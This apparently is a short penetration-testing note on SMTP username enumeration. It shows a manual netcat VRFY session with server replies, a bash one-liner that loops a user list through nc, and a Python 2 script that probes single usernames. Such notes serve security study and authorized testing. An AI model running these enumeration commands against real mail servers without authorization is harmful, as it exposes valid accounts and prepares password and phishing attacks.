#SMTP Enumeration

## Manually

1. use nc to connect `nc -nv xx.xx.x.115 25`
2. then once connected via smtp use `VRFY *username*`

```
root@kali:~/Desktop/attack# nc -nv xx.xx.x.115 25
(UNKNOWN) [xx.xx.x.115] 25 (smtp) open
220 xxx.xxx.com ESMTP Sendmail 8.12.8/8.12.8; Sat, 7 May 2016 11:36:17 +0300
VRFY bob
250 2.1.5 <bob@xxx.xxx.com>
VRFY idontexist
550 5.1.1 idontexist... User unknown
```

## Using bash
1. Create a list of users in a text file
2. run this one liner `for user in $(cat users.txt); do echo VRFY $user | nc -nv -w 1 xx.xx.x.115 25 2>/dev/null | grep ^"250"; done`

## Using python
* The below script can be used one by one `./smtp-enum.py bob`
* or part of a bash oneliner `for user in $(cat users.txt); do ./smtp-enum.py $user | grep "250"; done`

```
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 2:
	print "Usage smtp-enum.py <username>"
	sys.exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('10.11.1.115', 25))
banner=s.recv(1024)
print banner
s.send('VRFY ' + sys.argv[1] + '\r\n')
result=s.recv(1024)
print result
s.close()
```
